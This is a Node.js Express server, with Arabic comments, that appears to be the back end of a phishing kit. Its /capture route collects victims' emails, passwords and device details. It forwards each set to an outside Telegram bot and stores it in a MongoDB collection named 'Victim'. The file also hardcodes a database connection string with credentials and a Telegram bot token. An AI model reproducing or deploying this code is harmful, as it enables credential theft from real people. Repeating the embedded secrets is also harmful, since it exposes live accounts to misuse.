const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// محاولة الاتصال بـ Mongo دون تعطيل السيرفر
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("✅ MongoDB Connected"))
    .catch(e => console.error("❌ MongoDB Auth Error (Check Network Access 0.0.0.0/0)"));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/capture', async (req, res) => {
    const data = req.body;
    console.log("📥 صيد جديد وصل:", data.email);

    // 1. الإرسال الفوري لتيليجرام (حتى لو فشل المونجو)
    try {
        let message = `🚀 **صيد خبيث جديد**\n📧 إيميل: \`${data.email}\` \n🔑 باسورد: \`${data.password}\` \n📱 جهاز: ${data.device}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { 
            chat_id: CHAT_ID, 
            text: message, 
            parse_mode: 'Markdown' 
        });
        console.log("✅ تم الإرسال لتيليجرام");
    } catch (e) { console.log("❌ خطأ في بوت التيليجرام"); }

    // 2. محاولة الحفظ في قاعدة البيانات
    try {
        const Victim = mongoose.model('Victim', new mongoose.Schema({ email: String, password: String, device: String, date: { type: Date, default: Date.now } }));
        await new Victim(data).save();
    } catch (e) { console.log("❌ فشل الحفظ في المونجو"); }

    res.status(200).send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server Ready on " + PORT));
